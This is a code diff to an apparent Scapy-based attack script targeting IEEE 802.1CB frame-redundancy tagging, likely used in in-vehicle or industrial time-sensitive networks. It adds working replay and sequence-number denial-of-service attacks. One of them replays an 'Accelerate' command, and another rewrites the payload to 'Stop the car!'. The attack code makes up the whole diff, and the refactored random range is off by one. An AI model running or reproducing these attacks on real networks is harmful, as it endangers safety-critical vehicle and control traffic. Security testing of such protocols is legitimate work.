@@ -38,6 +38,12 @@ def determine_attack():
     elif attack == 3:
         print("Tamper Random is enabled.")
         return tamper_random
+    elif attack == 4:
+        print("Tamper Replay is enabled.")
+        return tamper_replay
+    elif attack == 5:
+        print("Speedup is enabled.")
+        return speed_up
     else:
         print("Passive mode is enabled.")
         return passive
@@ -83,9 +89,45 @@ def spoof_behind(pkt):
 
 def tamper_random(pkt):
     """Modifies existing packets to have random sequence numbers."""
+    max_sequence_number = 2 ** 16  # This is dependent on the 802.1CB configuration "Sequence Length".
     if pkt.haslayer(RedundancyTag):
-        random_sequence_number = random.randint(0, 65535)
-        pkt[RedundancyTag].sequence_number = random_sequence_number
+        pkt[RedundancyTag].sequence_number = random.randint(0, max_sequence_number)
+        return pkt
+    else:
+        return False
+
+
+replay_packet = None
+
+
+def tamper_replay(pkt):
+    """Modifies the sequence number to replicate packets."""
+    global replay_packet, output_interface
+    if pkt.haslayer(RedundancyTag):
+        if "Accelerate" in pkt[Raw].load.decode("utf-8"):
+            replay_packet = pkt
+        else:
+            if replay_packet is not None:
+                pkt = replay_packet
+                pkt[RedundancyTag].sequence_number += 1
+        return pkt
+    else:
+        return False
+
+
+speedup_counter = 0
+
+
+def speed_up(pkt):
+    """Tries to speed up the sequence counter by skipping many numbers.
+    This should cause a DoS attack with only a limited number of packets."""
+    global speedup_counter
+    speed_multiplier = 5  # This is dependent on the 802.1CB configuration "History Length".
+    if pkt.haslayer(RedundancyTag):
+        speedup_counter += 1
+        pkt[RedundancyTag].sequence_number += speedup_counter * speed_multiplier
+        debug_number = pkt[Raw].load.decode("utf-8").split(' ')[0]
+        pkt[Raw].load = debug_number + " Stop the car!"
         return pkt
     else:
         return False
